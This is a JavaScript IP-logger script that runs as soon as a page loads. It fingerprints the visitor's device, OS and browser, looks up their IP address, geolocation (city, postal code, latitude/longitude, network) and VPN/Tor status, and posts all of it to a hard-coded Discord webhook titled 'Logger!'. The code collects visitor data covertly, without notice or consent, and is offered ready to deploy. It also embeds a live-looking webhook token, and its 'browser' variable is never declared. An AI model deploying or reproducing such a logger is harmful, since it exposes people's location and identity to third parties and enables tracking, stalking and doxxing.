const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            // Device and OS detection
        const userAgent = navigator.userAgent;
        let device = "Unknown Device";
        let osVersion = "Unknown";

        // iPhone detection
        if (/iPhone/i.test(userAgent)) {
            device = "iPhone";
            const match = userAgent.match(/OS (\d+_\d+(_\d+)?)/);
            if (match) osVersion = match[1].replace(/_/g, '.');

            const ratio = window.devicePixelRatio || 1;
            const width = screen.width * ratio;
            const height = screen.height * ratio;

            if (width === 1170 && height === 2532) device += " 13/14 Pro";
            else if (width === 1284 && height === 2778) device += " 13/14 Pro Max";
            else if (width === 1125 && height === 2436) device += " X/XS/11 Pro";

        // iPad detection
        } else if (/iPad/i.test(userAgent)) {
            device = "iPad";
            const match = userAgent.match(/OS (\d+_\d+(_\d+)?)/);
            if (match) osVersion = match[1].replace(/_/g, '.');

        // Android detection
        } else if (/Android/i.test(userAgent)) {
            device = "Android Device";
            const match = userAgent.match(/Android (\d+(\.\d+)?)/);
            if (match) osVersion = match[1];

        // Mac detection
        } else if (/Macintosh/i.test(userAgent)) {
            device = "Mac";
            const match = userAgent.match(/Mac OS X (\d+[_\.]\d+(_\d+)?)/);
            if (match) osVersion = match[1].replace(/_/g, '.');

        // Windows detection
        } else if (/Windows NT/i.test(userAgent)) {
            device = "Windows PC";
            const match = userAgent.match(/Windows NT (\d+(\.\d+)?)/);
            if (match) {
                const versionMap = {
                    "10.0": "10",
                    "6.3": "8.1",
                    "6.2": "8",
                    "6.1": "7",
                    "6.0": "Vista",
                    "5.1": "XP"
                };
                osVersion = versionMap[match[1]] || match[1];
            }

        // Linux detection
        } else if (/Linux/i.test(userAgent)) {
            device = "Linux PC";
        }

        // === Browser Detection ===
        if (/OPR|Opera/i.test(userAgent)) {
            const match = userAgent.match(/(Opera|OPR)\/(\d+(\.\d+)?)/);
            browser = match ? `Opera ${match[2]}` : "Opera";
        } else if (/Edg/i.test(userAgent)) {
            const match = userAgent.match(/Edg\/(\d+(\.\d+)?)/);
            browser = match ? `Edge ${match[1]}` : "Edge";
        } else if (/Chrome/i.test(userAgent)) {
            const match = userAgent.match(/Chrome\/(\d+(\.\d+)?)/);
            browser = match ? `Chrome ${match[1]}` : "Chrome";
        } else if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) {
            const match = userAgent.match(/Version\/(\d+(\.\d+)?)/);
            browser = match ? `Safari ${match[1]}` : "Safari";
        } else if (/Firefox/i.test(userAgent)) {
            const match = userAgent.match(/Firefox\/(\d+(\.\d+)?)/);
            browser = match ? `Firefox ${match[1]}` : "Firefox";
        } else if (/MSIE|Trident/i.test(userAgent)) {
            const match = userAgent.match(/(MSIE |rv:)(\d+(\.\d+)?)/);
            browser = match ? `Internet Explorer ${match[2]}` : "Internet Explorer";
        }

            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(res => res.json())
                .then(data => {

                    const isProxy = data.security?.proxy === true;
                    const isTor   = data.security?.tor === true;
                    const isVpn   = data.security?.vpn === true;

                    let status;

                    if (isProxy || isTor || isVpn) {
                        status = "Likely Proxy / VPN / Tor\n";
                } else {
                        status = "Not a Proxy\n";
                }
            
                return fetch(`https://ipapi.co/${ipadd}/json/`)
                    .then(geoResponse => geoResponse.json())
                    .then(geoData => {
                        const dscURL = 'https://discord.com/api/webhooks/1443094310169088050/6IZeJRM-6yBlD-GOK9t_mfaI89UO7LaPuo80CTNQY9PxgZAFaDYIWZM9GiAGmkVQzftL'; 
                        return fetch(dscURL, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                                },
                            body: JSON.stringify({
                                username: "site logger <3", 
                                avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", 
                                content: `@here`,
                                embeds: [
                                    {
                                        title: 'Logger!',
                                        description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**Proxy Status >> ** ${status}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}\n\n**Device >> ** ${device}\n**OS Version >> ** ${osVersion}\n**Browser >> ** ${browser}`,
                                        color: 0x800080 
                                    }
                                ]
                            })
                        });
                    })
                }
            )
        })
        .then(dscResponse => {  
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};
sendIP();
